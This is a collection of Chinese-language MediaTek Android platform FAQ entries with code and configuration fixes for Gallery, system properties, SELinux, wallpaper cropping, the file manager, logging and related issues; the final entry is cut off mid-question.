## [FAQ13537]  [Gallery] 将PC图片收藏里的图片cpy至手机，会不显示缩略图查看detail会报错

```text
Win7 拷过来的图从ultraedit中看到它的exif header并不算是标准的，会导致gallery读取exif时发生exception，因此无法显示缩略图和detail信息
修改方法如下：
在ExifParser.java文件readTag函数中约561 行

System.arraycopy(mDataAboveIfd0, (int)***************)
修改为：
if (mDataAboveIfd0 == null) return null;
System.arraycopy(mDataAboveIfd0, (int)***************)
```

## [FAQ12118]  关于修改底色为白色后，设置中菜单字体显示为灰色字体问题（白底黑字）

```text
修改背景底色为白色后，设置下有些菜单字体显示为灰色，如下：
设置里安全选项里 “Auto start management,App permissions,Clear Credentials”三个字体的颜色灰色
要修改字体为黑色，请参考如下solution
 
[SOLUTION] 
请修改  mediatek/packages/apps/PermissionControl/AndroidManifest.xml
<application
    android:taskAffinity=""
    android:persistent="true"
    android:icon="@mipmap/ic_launcher_settings"
    android:theme="@android:style/Theme.Holo"
    android:allowClearUserData="false" >
修改android:theme和贵司setting使用的theme一致。
请修改后测试即可。如果仍然有疑问请再联系MTK技术人员。
```

## [FAQ12117]  手动安装apk,恢复出厂设置后，应用没有删除

```text
关闭 ProjectConfig.mk 中的 MTK_SPECIAL_FACTORY_RESET 或者 push 一个内容为空的 .keep_list 到 data/app 即可解决此问题
```

## [Browser]  [FAQ11264]  无法保存包含“{CID}”的网址为书签

```text
由于"{" / "}"为非法的URL字符，所以无法保存，如果您需要保存此类网址，建议在保存前将“{CID}” 替换成Client ID，可以按如下方式修改：
AddBookmarkPage.java
import com.android.browser.provider.BrowserProvider;
boolean save() {
    ...
    if (unfilteredUrl.indexOf("{CID}") != -1) { 
        unfilteredUrl = unfilteredUrl.replace("{CID}", 
        BrowserProvider.getClientId(getApplicationContext().getContentResolver())); 
    }
    String url = unfilteredUrl.trim();
    ...
}
```

## [USB]  [FAQ10927]  [USB serial number客制化]  [系列6] ：能否实现adb devices的序列号，usb serial number, cts device ID，SN一致?

```text
adb devices, Serial number, 手机序列号, USB serialno, usb序列号, sn, cts device ID
[SOLUTION] 
adb devices的序列号 : 为sys/class/android_usb/android0/iSerial结点值，在开机过程中on init阶段（init.usb.rc文件中）写入
usb serial number : 即usb spec规定的usb的serial number, 代码中对应sys/class/android_usb/android0/iSerial结点值
cts device ID : 就是adb devices的序列号
SN : 为getSystemService(Context.TELEPHONY_SERVICE)).getSN()获取到的，需要在android起来之后获取
综上，adb devices的序列号，usb serial number, cts device ID是一致的，但是不能做到与SN一致
```

## [USB]  [FAQ10924]  [USB serial number客制化]  [系列3] ：如何修改手机序列号为Barcode?

```text
adb devices, Serial number, 手机序列号, USB serialno, usb序列号, sn, Barcode
[SOLUTION] 
请参考：[FAQ09340]  如何使SN Write tool写入的Barcode在“设置->关于手机->状态信息->序列号”中显示出来?
需要注意的是，此Barcode是由SN Write tool写入的。
```

## [prop]  [FAQ04349]  不能添加系统属性system property, 提示： permission denied uid:xxxxx name:xxxxx

```text
system property  permission denied  无法写入 没有权限
 
[Solution] 
首先说明一下system property 的使用API
Java API
android.os.SystemProperties
public String get(String key);
public String get(String key, String def);
public int getInt(String key, int def);
public long getLong(String key, long def);
public void set(String key, String val); => the return value is void

Native API
libcutils/Properties.h & Properties.c
int property_set(const char* key, const char* value);
int property_get(const char* key, char* value, const char* def);
int property_list(void(*propfn)(const char* key, const char* value, void * cookie), void * cookie);

Android Toolbox
adb shell getprop
 return all properties, as list
adb shell getprop <key>
    return the property base on key
adb shell setprop <key> <value>
    set the property <key> <-> <value>

Init.rc
setprop <key> <value>
on property:<key>=<value>
 some actions.

其次 system property 的重要性
system property 是存在在init 进程中的关键系统属性，如系统安全，系统稳定性，系统的版本信息等，一般情况下，都不建议使用system property 来进行信息共享，一来容量有限，二来可能导致系统安全等其他问题。
 
最后 如何添加:

(1). android L(5.0) 以前的版本:

Init 通过socket 对端的UID 和 system/core/init/property_service.c 中的permission table 匹配来确认是否可以添加。table 一般分成三列：
{ prefix.,   UID,    GID },
比如
{ "sys.",   AID_SYSTEM,   0 }, 即说明如果是以sys. 开头，那么uid 是system (1000) 的 或者gid 是 root(0) 的都可以访问，修改。注意如果是"ro." 开头，则忽略掉"ro." 这三个字符。
Permission Table 有两个，对于非 ctl.start/ctl.stop 开头的系统属性，即普通属性，通过 property_perms 来控制。
如果是 ctl.start/ctl.stop 即控制属性，那么通过 control_perms 来控制。
对于"ro." 开头的系统属性，如果原本已经存在，则无法再修改，所谓"read only", 即最多写一次。

一般APP 因为没有固定的UID(每次安装可能都不一样), 所以肯定无法添加。所以首先就要在AndroidMenifest.xml 添加对应的UID 说明，其次需要使用系统相对应的签名，然后push 到system/app 下面，成为系统APK。这样你启动这个APP 之后就可以ps 去查看它的UID 了，确认正确。
然后就是去更新 system/core/init/property_service.c 添加对应的访问权限

普通APP 因为没有固定的UID， 故是无法直接添加system property.

(2). android L(5.0) 以及以后的版本: 
Google 删除了permission table, 而是直接通过SELinux 来限制SELinux 的添加与修改.
对于"ro." 开头的系统属性，如果原本已经存在，则无法修改，所谓"read only", 即最多写一次。
对于一个 "xxx.yyy.zzz" 的系统属性("ro.xxx.yyy.zzz" 当作 "xxx.yyy.zzz" 看待),

(2.0) 首先到external/sepolicy/property_contexts , device/mediatek/common/sepolicy/property_contexts 查看是否有绑定它或者它的前缀(如 xxx.yyy.zzz, xxx.yyy, xxx.yyy., xxx.,xxx 等) 的SELinux Context, 如果有, 则忽略掉(2.1), (2.2) 这两步.

(2.1) 在device/mediatek/common/sepolicy/property.te 中 定义这个系统属性 "xxx.yyy.zzz" 的SELinux Context.
 type xxx_yyy_zzz_prop, property_type;
 
(2.2) 在device/mediatek/common/sepolicy/property_contexts 中 绑定这个系统属性所对应的SELinux Context.
 xxx.yyy.zzz xxx_yyy_zzz_prop;

(2.3) 在对应的Process(假设为demo)在device/mediatek/common/sepolicy/demo.te 中新增
   unix_socket_connect(demo,property,init);
   allow demo xxx_yyy_zzz_prop:property_service set;
   
同样Google 严禁普通的app (untrusted app)增加和修改system property.
```

## [prop]  [FAQ11164]  关于systemproperty ro.baseband, ro.bootloader, ro.bootmode的设置问题

```text
这三个属性值目前Mediatek platform 并没有使用到，如果需要设置，可以直接更新system/core/init/init.c 中export_kernel_boot_props 函数中的prop_map 数组， 默认都是unknown.
注意的是如果修改对应project 中的system.prop 是无效的，因为此时export_kernel_boot_props 的执行在load system/build.prop 之前。 而ro. 开头的system property 一旦写入就无法再更新。
 
[相关FAQ] 
FAQ07367: 如何设置system property 默认值
FAQ04349: 不能添加system property, 提示： permission denied uid:xxxxx  name:xxxxx
FAQ03994: system property 写入/更新后，马上读取无效问题
FAQ03778: 如何对system property 进行扩容
FAQ06739: system property 设置失败的可能性分析和初步诊断
FAQ03994: system property 写入/更新后，马上读取无效问题
FAQ10716：system property 重启或者恢复出厂设置后无效(丢失)
FAQ10974: Android KK 4.4 后，在host 端使用system property 无法编译通过
```

## [prop]  [FAQ03778]  如何对系统属性 systemproperty 进行扩容

```text
在KK 4.4 以前, 因为system property 线性设计简单，只为共享有限关键数据而设计，如果增加容量将会导致执行变慢, Google 不推崇对system property 进行扩容.
在线性结构下， system property 的buffer 分成三块，
     Head 块固定32个字节; 
     Info 块存放property name 的简单hash值，每个4个字节; 
     Data 区存放property 的key<->value 真实数据，每个128个字节;
 
system property 实现定义在system/core/init/property_service.c 中，扩容涉及到三个参数, 即三个宏的更新:
     PA_COUNT_MAX 定义property 的最多数量，google 默认为247, 我司已经增加128，至247+128=375
     PA_INFO_START 定义Data 区的起始位置，故PA_INFO_START 为Head + Info >= 32 + PA_COUNT_MAX*4, 最好取32的整数倍，以便对齐
     PA_SIZE 定义整个buffer 的大小，故PA_SIZE >= PA_INFO_START + PA_COUNT_MAX*128
  
 在JB 4.2 版本，MTK 为方便大家更新已经将这三个宏对接起来，大家只需要更新PA_COUNT_MAX 即可
  
KK 4.4 以后，Google 已经使用Hybird trie/binary tree 结构代替了原来的线性结构，性能大为提升，对应的system property 数量也大为提升, 接近1024 个，通常已经足够使用。设置是在
alps/bionic/libc/include/sys/_system_properties.h 中
#define PA_SIZE         (128 * 1024)
 
 
FAQ07367: 如何设置system property 默认值
FAQ04349: 不能添加system property, 提示： permission denied uid:xxxxx name:xxxxx
FAQ03994: system property 写入/更新后，马上读取无效问题
FAQ06739: system property 设置失败的可能性分析和初步诊断
FAQ03994: system property 写入/更新后，马上读取无效问题
FAQ10716: system property 重启或者恢复出厂设置后无效(丢失)
```

## [prop]  [FAQ06739]  system property 设置失败的可能性分析和初步诊断

```text
首先说明一下system property 的使用API
Java API
android.os.SystemProperties
public String get(String key);
public String get(String key, String def);
public int getInt(String key, int def);
public long getLong(String key, long def);
public void set(String key, String val); => the return value is void

Native API
libcutils/Properties.h & Properties.c
int property_set(const char* key, const char* value);
int property_get(const char* key, char* value, const char* def);
int property_list(void(*propfn)(const char* key, const char* value, void * cookie), void * cookie);

Android Toolbox
adb shell getprop
return all properties, as list
adb shell getprop <key>
return the property base on key
adb shell setprop <key> <value>
set the property <key> <-> <value>

Init.rc
setprop <key> <value>
on property:<key>=<value>
some actions.

其次 system property 的重要性
system property 是存在在init 进程中的关键系统属性，如系统安全，系统稳定性，系统的版本信息等，system property 容量有限，不能随意添加。

那system property 设置失败，通常有哪些可能的原因呢，在这里我列举常见的五类:
Case 1: 没有在property_service.c 中增加相关的权限，请参考FAQ:  不能添加system property, 提示： permission denied uid:xxxxx  name:xxxxx
Case 2: system prop 已经满，无法再写入，请参考FAQ: 如何对system property 进行扩容
Case 3: 这个property <key,value> 的key 的长度超过了32， value 的长度超过了92, 直接拒绝, 注意长度包括结尾字符.
Case 4: socket 连接有问题，因为其他非init process 是通过socket 连接到init process 来设置system property的，如果socket 不能正常的连接，即设置无法成功。socket 最有可能出的问题就是无法申请到fd(文件句柄)，即如果当时的process 发生了fd leak, fd 的数量已经达到或者接近1024 时，就无法申请到新的fd， 从而无法创建socket 连接。您可以通过ls -a -l proc/processid/fd 来查看具体的process 的fd list. 从而确认fd 的使用情况，去分析fd leak 的原因，更多fd leak 的分析，需要您们针对具体的case 提eservice 由MTK 的工程师协助分析。
Case 5: KK 版本以后版本, 对应进程如果没有设置system property 的权限，被SELinux Reject 掉, 请参考FAQ： [SELinux Policy]  如何设置SELinux 策略规则 ? 在Kernel Log 中出现"avc: denied" 要如何处理?

相关FAQ:
[FAQ04349] : 不能添加system property, 提示： permission denied uid:xxxxx  name:xxxxx
https://online.mediatek.com/Pages/FAQ.aspx?List=SW&FAQID=FAQ04349
[FAQ03778] : 如何对system property 进行扩容
https://online.mediatek.com/Pages/FAQ.aspx?List=SW&FAQID=FAQ03778
[FAQ11486] : [SELinux Policy]  如何设置SELinux 策略规则 ? 在Kernel Log 中出现"avc: denied" 要如何处理?
https://online.mediatek.com/Pages/FAQ.aspx?List=SW&FAQID=FAQ11486
```

## [FAQ12691]  [Gallery] 图库中设置高分辨率壁纸出错

```text
Root Cause: Bitmap RegionDecode 时发生OutOfMemoryError;
 
修改alps/packages/Gallery2/src/com.android.gallery3d.filtershow.crop/CropActivity.java中 (between” Edit Start “and “Edit End” )：
.…..
BitmapIOTask(…) {
….
doInBackground(Bitmap … params) {
…
    Bitmap crop = null;
            if (decoder != null) {
                // Do region decoding to get crop bitmap
                BitmapFactory.Options options = new BitmapFactory.Options();
                options.inMutable = true;
/**********************************************Edit Start *****************************************************************************/
                /// M: increase sample size to avoid OOM for extremely large image. @{
                int sampleSize = 1;
                long maxMemory = Runtime.getRuntime().maxMemory();
                while ((roundedTrueCrop.width() >> (sampleSize - 1)) * (roundedTrueCrop.height() >> (sampleSize - 1)) * 4
                        > maxMemory) {
                    if (sampleSize > 5) break;
                    sampleSize++;
                    Log.i(LOGTAG, "BitmapIOTask.doInBackground, image too large, set sample size to " + sampleSize);
                }
                options.inSampleSize = sampleSize;
                /// @}

/***************************************************************Edit End *************************************************************/
                crop = decoder.decodeRegion(roundedTrueCrop, options);
                decoder.recycle();
            }
```

## [默认值]  [FAQ04156]  [Hotspot] 如何修改便携式热点的默认SSID名称

```text
TD项目修改alps\mediatek\source\frameworks\base\core\res\res\values\Strings.xml中

的wifi_tether_configure_ssid_default_for_cmcc变量

非TD项目修改alps\frameworks\base\core\res\res\values\strings.xml中的wifi_tether_configure_ssid_default变量

JB版本：
TD:\alps\mediatek\frameworks\base\res\res\values\Strings.xml中wifi_tether_configure_ssid_default_for_cmcc变量
非TD：alps\frameworks\base\core\res\res\values\strings.xml中的wifi_tether_configure_ssid_default变量

JB2&JB3&JB5版本：
首选配置alps\mediatek\config\$(项目名)\custom.conf文件下的wlan.SSID名字

若这里没有配置，则规则与JB版本相同
```

## [sound]  [FAQ13066] 后台播放音乐，进入情景模式预览铃声音量时，后台音乐不停止播放

```text
android是允许声音同时播放的，这个是google default设计。如果想在预览铃声时关闭后台音乐播放，JB版本可以参考FAQ04474进行修改，KK版本上，请按如下方式修改：
在RingerVolumePreference.java中，
onBindDialogView 的时候
((AudioManager) getSystemService(AUDIO_SERVICE)).requestAudioFocus(null, AudioManager.STREAM_RING, AudioManager.AUDIOFOCUS_GAIN_TRANSIENT);

然后在onDialogClosed 的时候
((AudioManager) getSystemService(AUDIO_SERVICE)).abandonAudioFocus(null);
```

## [FAQ12385]  [Jb]  [KK] 版本判断能否实现横屏竖用

```text
手机里面说的横屏，指的是他们width>height的屏，在屏的规格书里面，可以看到他显示的分辨率比如为：1024*600， 800*480。
手机里面说的竖屏，指的是他们width<height的屏，在屏的规格书里面，可以看到他显示的分辨率比如为：600*1024， 480*800，常规做法应该是手机使用这样的竖屏。
但是有些客户在选料的时候，会选用横屏LCM，实际手机用户还是作为竖屏在看，这就是横屏竖用。

[SOLUTION] 
实现横屏竖用需要满足两个条件，一是满足平台的分辨率要求，即横屏的width不大于平台支持的最大分辨率的width；二是把资源旋转90°或者270°，使用户可以看到竖着的图形，通过配置MTK_LCM_PHYSICAL_ROTATION=90或者270实现旋转。

如下举两个例子说明横屏竖用：
1、92kk版本如何在1024*600 的横屏上实现竖用，首先判断92最大分辨率为1200*1920，可知1200 > 1024，所以满足分辨率要求，那么实现方案即为：lcm driver里面配置width=1024， height=600，ProjectConfig.mk里面配置width=1024， height=600，MTK_LCM_PHYSICAL_ROTATION=90或者270（这里的90/270是根据lcm来配置的，如果实际不知道该选哪个数字，可以都配置一下，哪个可以显示就使用那个）。

2、72JB版本如何在800*480的横屏上面实现竖用，首先判断72最大分辨率为540*960，可知540<800，所以不满足分辨率要求，那么就说明这个800*480的横屏，无法在72平台上面实现横屏竖用。
```

## [FAQ12715]  设置壁纸时，发生 java.lang.IllegalArgumentException: y + height must be <= bitmap.height()

```text
当使用第三方应用或Launcher设置壁纸，如果走到WallpaperCropActivity.java (alps\frameworks\base\packages\wallpapercropper\src\com\android\wallpapercropper)
并且错误log如下：
08-23 14:48:20.688 11177 11208 E AndroidRuntime: Caused by: java.lang.IllegalArgumentException: y + height must be <= bitmap.height()
08-23 14:48:20.688 11177 11208 E AndroidRuntime:  at android.graphics.Bitmap.createBitmap(Bitmap.java:676)
08-23 14:48:20.688 11177 11208 E AndroidRuntime:  at android.graphics.Bitmap.createBitmap(Bitmap.java:640)
08-23 14:48:20.688 11177 11208 E AndroidRuntime:  at com.android.wallpapercropper.WallpaperCropActivity$BitmapCropTask.cropBitmap(WallpaperCropActivity.java:638)
08-23 14:48:20.688 11177 11208 E AndroidRuntime:  at com.android.wallpapercropper.WallpaperCropActivity$BitmapCropTask.doInBackground(WallpaperCropActivity.java:728)
08-23 14:48:20.688 11177 11208 E AndroidRuntime:  at com.android.wallpapercropper.WallpaperCropActivity$BitmapCropTask.doInBackground(WallpaperCropActivity.java:404)
08-23 14:48:20.688 11177 11208 E AndroidRuntime:  at android.os.AsyncTask$2.call(AsyncTask.java:288)
08-23 14:48:20.688 11177 11208 E AndroidRuntime:  at java.util.concurrent.FutureTask.run(FutureTask.java:237)
 
则属于这种case
 
[SOLUTION] 
请按照如下修改: WallpaperCropActivity.java(alps\frameworks\base\packages\wallpapercropper\src\com\android\wallpapercropper)
     
public boolean cropBitmap() {
 boolean failure = false;
 ...................................
         if (fullSize != null) {
            mCropBounds.left /= scaleDownSampleSize;
            mCropBounds.top /= scaleDownSampleSize;
            mCropBounds.bottom /= scaleDownSampleSize;
            mCropBounds.right /= scaleDownSampleSize;
            mCropBounds.roundOut(roundedTrueCrop);
            
            /*mtk modify start*/
            if(roundedTrueCrop.left < 0) {
               roundedTrueCrop.left = 0;
               }
            if(roundedTrueCrop.top < 0) {
               roundedTrueCrop.top = 0;
               }
            if(roundedTrueCrop.left + roundedTrueCrop.width() > fullSize.getWidth()) {
               roundedTrueCrop.right -= roundedTrueCrop.left + roundedTrueCrop.width() - fullSize.getWidth();
                }
            if(roundedTrueCrop.top + roundedTrueCrop.height() > fullSize.getHeight()) {
                roundedTrueCrop.bottom -= roundedTrueCrop.top + roundedTrueCrop.height() - fullSize.getHeight();
                }
        /*mtk modify end*/
        
          crop = Bitmap.createBitmap(fullSize, roundedTrueCrop.left,
                    roundedTrueCrop.top, roundedTrueCrop.width(),
                    roundedTrueCrop.height());
                }

```

## [sound]  [FAQ12010]  [common] 音乐播放器中随机播放（shuffle）功能异常

```text
1. 进入音乐播放器，播放一首歌曲；
2. 打开随机播放；
3. 播放另一首歌；
4. 关闭随机播放；
5. 当播放完毕，不会顺序跳到下一首，而是跳到随机播放的歌曲。----》不符合预期.

[SOLUTION] 
此问题是由于关闭随机播放后，并没有重新设置下一首待播放歌曲的音源，仍然使用开启随机播放时保存的下一首歌曲。
修改方法如下：
在packages\apps\Music\src\com\android\music\MediaPlaybackService.java中的如下函数：
public void setShuffleMode(int shufflemode)
如下代码之前：mShuffleMode = shufflemode
添加下面代码：
/// M: To make sure the shuffle mode will take effect after change shuffle mode.
/// The nextplayer shoud be reset,so we should set NextPlayer to null.
if (mPlayer.isInitialized()) {
    mPlayer.setNextDataSource(null);
}
```

## [FAQ12555]  手机中setting下CPU使用菜单里的数据信息所代表的含义

```text
手机Setting菜单下开发者选项中菜单CPU使用显示信息所代表的含义
[SOLUTION] 
如图：在选择了settings-->developer options-->show cpu usage 之后，手机界面会有以下信息显示

绿色代表普通优先级的进程，
蓝色代表低优先级的进程，
红色是系统进程，

这三个数值代表不同间隔下（1，5，15分钟）估算的平均负载（load average）
数字下面显示的就是正在运行的各种进程，包括系统和应用程序的执行序(process)。
一般会选择看后面的两个数字，了解系统是否会有长时间处在高负载的状况，短暂、突发的高负载并不会造成问题，
可忽略不管，数字越小越好，数字较大就表示机器过载或有某种问题
```

## [storage]  [FAQ11641]  当文件夹路径从n层按back键退回到n-19层的时候，file manager自动退出

```text
当文件夹路径从n层按back键退回到n-19层的时候，file manager自动退出，比如在63层按back 键退回到44层的时候，file manager自动退出。

1.FileManager默认设计, FileManager种只记录最多20条操作路径的记录, 如果超出就会把最早加入的记录删除. 贵司可以参考alps/mediatek/packages/apps/FileManager/src/com/mediatek/filemanager/FileInfoManager.java中这部分的代码．
    /** Max history size */
    private static final int MAX_LIST_SIZE = 20;
    private final List<NavigationRecord> mNavigationList = new LinkedList<NavigationRecord>();
    /**
     * This method gets the previous navigation directory path
     * 
     * @return the previous navigation path
     */
    protected NavigationRecord getPrevNavigation() {
        while (!mNavigationList.isEmpty()) {
            NavigationRecord navRecord = mNavigationList.get(mNavigationList.size() - 1);
            removeFromNavigationList();
            String path = navRecord.getRecordPath();
            if (!TextUtils.isEmpty(path)) {
                if (new File(path).exists() || MountPointManager.getInstance().isRootPath(path)) {
                    return navRecord;
                }
            }
        }
        return null;
    }
    /**
     * This method adds a navigationRecord to the navigation history
     * 
     * @param navigationRecord the Record
     */
    protected void addToNavigationList(NavigationRecord navigationRecord) {
        if (mNavigationList.size() <= MAX_LIST_SIZE) {
            mNavigationList.add(navigationRecord);
        } else {
            mNavigationList.remove(0);
            mNavigationList.add(navigationRecord);
        }
    }
    /**
     * This method removes a directory path from the navigation history
     */
    protected void removeFromNavigationList() {
        if (!mNavigationList.isEmpty()) {
            mNavigationList.remove(mNavigationList.size() - 1);
        }
    }
 
 
2.对于20条操作路径的history record, 贵司可以修改，只需要把FileInfo.Manager.java中的MAX_LIST_SIZE设为需要的最大路径记录数。这样修改带来的影响是，file manager APK可能会用到更多的内存，因为List<NavigationRecord> mNavigationList需要记录更多的路径数。
alps/mediatek/packages/apps/FileManager/src/com/mediatek/filemanager/FileInfoManager.java中这部分的代码．
    /** Max history size */
    private static final int MAX_LIST_SIZE = xxx;
```

## [storage]  [FAQ11051]  文件管理器按大小排序时，只会排序file，不会排序folder

```text
这是目前的design，主要考虑的是performance问题。
文件夹的大小是不能直接拿到的，必须遍历文件夹下面的子文件和子文件夹的文件大小加起来做为文件大小，如果一个文件夹下有很多文件和子文件夹，这样迭代拿大小会很费时间，所以文件夹没有按大小排序。
```

## [storage]  [FAQ11556]  在file manager中重命名MP3的名称，进入Music中发现歌曲仍显示原来的名称

```text
进入文件管理中，将一个MP3重命名，重命名完成后进入Music播放器，发现原先被重命名过的MP3显示的仍然是原先的名称，而非重命名后的名称。

[SOLUTION] 
歌曲被Mediascanner扫描后，在Music播放器中，显示的是MP3中的ID3 tag，这个是内置在歌曲中的信息，所以即使在file manager中重命名，也不会改变在music中的名称.
note:有些工具，如格式工厂，将歌曲转换为MP3时会破坏tag里面的数据，此时若在file manager中修改，Music就会随着修改而改变。
```

## [init]  [FAQ11786]  为何工厂模式下无法adb 无法重启机器 ?

```text
KK 以后 Google 将关机/重启的最后转移到了init 进程上执行。 其他Process 通过system property sys.powerctl 通知init 执行。
sys.powerctl 的配置在init.rc 当中，可以参考
on property:sys.powerctl=*
   powerctl ${sys.powerctl}
   
然后执行system/core/init/builtins.c#do_powerctl 函数，call android_reboot 重启或者关机。
为何工厂模式下无法adb reboot ? 正常情况下adb reboot 可以重启， 其关键就是因为mediatek/config/{platform}factory_init.rc 中没有定义
on property:sys.powerctl=*
   powerctl ${sys.powerctl}
   
如果要添加此功能，只有在factory_init.rc 中添加这两行即可
```

## [FAQ10430]  在Native & App 层如何监测文件的更新

```text
Linux内核从2.6.13开始引入inotify 机制，它可以高效地实时跟踪Linux文件系统的变化。
它的典型的API 包括：
inotify_init ： creates an inotify instance and returns a file descriptor referring to the inotify instance. 
inotify_add_watch：  manipulates the "watch list" associated with an inotify instance. 
inotify_rm_watch： removes an item from an inotify watch list.
read：to determine what events have occurred, an application read(2)s from the inotify file descriptor.
close：close file monitor
 
通常我们会利用epoll 机制和inotify 机制结合来进行file monitor, 即利用epoll 来监控inotify_init的fd.
 
在Android 中，已经有完整的实现，在java 层可以直接使用android.os.FileObserver, 如果在native 层，也可以参阅它结合epoll & inotify的 实现：frameworks/base/core/jni/android_util_FileObserver.cpp
```

## [FAQ06687]  【MT6572/89】【JB/JB2】如何读取GPU版本信息?

```text
可以参考OpenGL相关函数调用

请使用eglQueryString() 或是 glGetString()函数

具体用法请参考：
http://www.khronos.org/registry/egl/sdk/docs/man/xhtml/eglQueryString.html
http://www.opengl.org/sdk/docs/man/xhtml/glGetString.xml

【Example】

调用libEGL.so,初始化EGL；
eglGetDisplay(EGL_DEFAULT_DISPLAY);
eglInitialize(display, NULL, NULL);
eglGetConfigs(display, NULL, 0, &numConfigs);
selectConfigForNativeWindow(display, attribs, mNativeWindow.get(), &config);
获取EGL相关参数；
================================================================
LOGI("EGL informations:");
LOGI("# of configs : %d", numConfigs);
LOGI("vendor    : %s", eglQueryString(display, EGL_VENDOR));
LOGI("version   : %s", eglQueryString(display, EGL_VERSION));
LOGI("extensions: %s", eglQueryString(display, EGL_EXTENSIONS));
LOGI("Client API: %s", eglQueryString(display, EGL_CLIENT_APIS)?:"Not Supported");
LOGI("EGLSurface: %d-%d-%d-%d, config=%p", r, g, b, a, config);
=====================================================================
获取GPU相关参数；
LOGI("OpenGL informations:");
LOGI("vendor    : %s", glGetString(GL_VENDOR));
LOGI("renderer  : %s", glGetString(GL_RENDERER));
LOGI("version   : %s", glGetString(GL_VERSION));
LOGI("extensions: %s", glGetString(GL_EXTENSIONS);

打印出来的信息如下：

EGL informations:
# of configs : 22
vendor    : Android
version   : 1.4 Android META-EGL
extensions: EGL_KHR_image EGL_KHR_image_base EGL_KHR_gl_texture_2D_image EGL_KHR_gl_texture_cubemap_image EGL_KHR_gl_renderbuffer_image EGL_KHR_fence_sync EGL_ANDROID_image_native_buffer
Client API: OpenGL_ES
EGLSurface: 8-8-8-8, config=0x2
OpenGL informations:
vendor    : Imagination Technologies
renderer  : PowerVR SGX 544MP
version   : OpenGL ES-CM 1.1
```

## [clock]  [FAQ10320]  如何判断网络更新时间是通过NITZ还是NTP方式的?

```text
设置一个错误的时区，查看时区是否有被更新正确，若时区有被更新，则说明GSM网路有送NITZ消息上来;  若只有时间更新，则还无法区分，可以再通过对log进一步的分析才能区分，下面介绍如何通过log来区分:
1： 用wireshark打开tcp dump log
2： 用NTP过滤，如果在该时间点左右，有搜到相关的信息，则说明是通过NTP请求的
```

## [log]  [FAQ12350]  如何利用adb命令查看mtklogger的状态

```text
（1）查看mtklogger settings.
adb command: cat /data/data/com.mediatek.mtklogger/shared_prefs/com.mediatek.mtklogger_preferences.xml

输出结果如下：
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
<string name="log_storage_location">2</string>    --> log path: 1 for phone storage, 2 for sd card
<boolean name="taglog_enable" value="true" />      -->  tag log enable or not
<boolean name="modemlog_switch" value="true" />  --> modemlog enable or not
<boolean name="exceptionreporter_enable" value="true" />  --> exception reporter enable or not
<boolean name="mobilelog_kernellog" value="true" />  --> kernel log enbale  or not
<string name="mobilelog_total_logsize">600</string>  --> mobile log total size
<boolean name="mobilelog_androidlog" value="true" />  -->android log enable or not
<string name="modemlog_logsize">600</string>  --> modem log size
<string name="networklog_logsize">200</string>  --> network log size
<boolean name="modemlog_autostart" value="false" /> --> modem log auto start or not
<boolean name="networklog_autostart" value="false" /> --> network log auto start or not
<string name="mobilelog_logsize">300</string>  --> mobile log size 
<boolean name="mobilelog_switch_bak" value="true" /> --> not used
<boolean name="networklog_switch" value="true" />  --> network log enable or not
<boolean name="mobilelog_autostart" value="false" /> --> mobile log auto start or not
<boolean name="mobilelog_switch" value="true" />  --> mobile log enable or not
<boolean name="mobilelog_btlog" value="true" />  --> bt log enable or not
<boolean name="ui_debug_mode_enable" value="false" /> --> UI Debug Mode enable or not
</map>

（2）查询mobile loggger的运行状态。
adb command:  getprop debug.MB.running  --> 如果为0, 表明mobile logger stopped; 如果为1，表明mobile logger recording。
adb command: getprop debug.MB.realpath  -->指明当前mobile log录制的路径。

（3）查询modem logger的运行状态。
adb command:  getprop debug.mdlogger.Running  --> 如果为0, 表明modem logger stopped; 如果为1，表明modem logger recording。

（4）查询network logger的运行状态。
adb command:  getprop debug.mtklog.netlog.Running  --> 如果为0, 表明network logger stopped; 如果为1，表明network logger recording。
adb command: getprop debug.netlog.writtingpath  -->指明当前network log录制的路径。
```

## [boot]  [FAQ12535]  选择重启，可以完整播放完关机动画

```text
敝司Default设计，关机过程会有一个delayForPlayAnimation，但是重启（除了恢复出产设置）不会，由于重启本身就牵涉到时间上的连续行，不会有任何delay。
修改方案：
贵司只需要在shutdownThread.java的
public static void rebootOrShutdown(boolean reboot, String reason) {
里面将如下if判断去掉：
if ((reason != null) && reason.equals("recovery")) {
    delayForPlayAnimation();
}
 
只保留
delayForPlayAnimation();
只要reboot都做delay
```

## [PMT]  [FAQ06257]  Flash上新建分区的大小限定

```text
目前的分区类型有如下两种：Rawdata和文件系统，文件系统的类型与Flash类型相关，Nand Flash上的文件系统为Yaffs2；Emmc上的文件系统为Ext4。
 
Rawdata：至少1*Block Size;
Yaffs2: 至少9*Block Size;
Ext4:至少5MB
 
目前常见的Nand Flash上，Block Size一般为128KB和256KB。
 
另外需要注意一点，新建分区的start address和size必须是Block align的。
```

## [sound]  [FAQ07180]  [Audio App] 如何修改Music Player中EQ参数?

```text
Google原始EQ参数定义在：
\frameworks\av\media\libeffects\lvm\wrapper\Bundle\EffectBundle.h
只需修改其中的定义即可
```

## [CMD]  [FAQ08697]  JB5版本中，输入adb shell之后，如何显示shell@android，而不是目前默认的shell@project_name

```text
修改external/mksh/mkshrc
 
From：

: ${TERM:=vt100} ${HOME:=/data} ${MKSH:=/system/bin/sh} ${HOSTNAME:=$(getprop ro.product.device)}
: ${SHELL:=$MKSH} ${USER:=$(typeset x=$(id); x=${x#*\(}; print -r -- ${x%%\)*})} ${HOSTNAME:=android}
 
To:

: ${TERM:=vt100} ${HOME:=/data} ${MKSH:=/system/bin/sh} ${HOSTNAME:=android}
: ${SHELL:=$MKSH} ${USER:=$(typeset x=$(id); x=${x#*\(}; print -r -- ${x%%\)*})} ${HOSTNAME:=android}
```

## [FAQ12481]  Recovery mode在cache/recovery目录下新建一支文件，重启后，新建文件消失了

```text
1、在recovery.cpp文件的最后新建一支文件 /cache/recovery/wetest；并写入内容：welcome to recovery mode！
2、编译版本、烧写手机，开机后，进行恢复出厂设置；等手机进入自动重启状，并在弹出开机向导前，通过命令进入到/cache/recovery/，有wetest文件，内容也正确；但是等开机向导走完之后，再进入/cache/recovery查看，生成的文件就消失了。
[SOLUTION] 
原因是：
开机完成后，在frameworks/base/core/java/android/os/recoverysystem.java里面会去判断/cache/recovery目录下面的文件是不是以"last_"开头的，如若不是，就会delete掉，目的是让该目录只存储recovery mode指定的几支文件。
如果有需求一定要在该目录下新建文件，请务必在您的文件名前加上前缀"last_"，以避免在重启后被删除。
```

## [OTA]  [FAQ10759]  MOTA升级成功后想保留OTA升级包该怎么办?

```text
MTK目前的默认设计是： MOTA升级成功后默认删除OTA包update.zip; 如果不想删除怎么办?
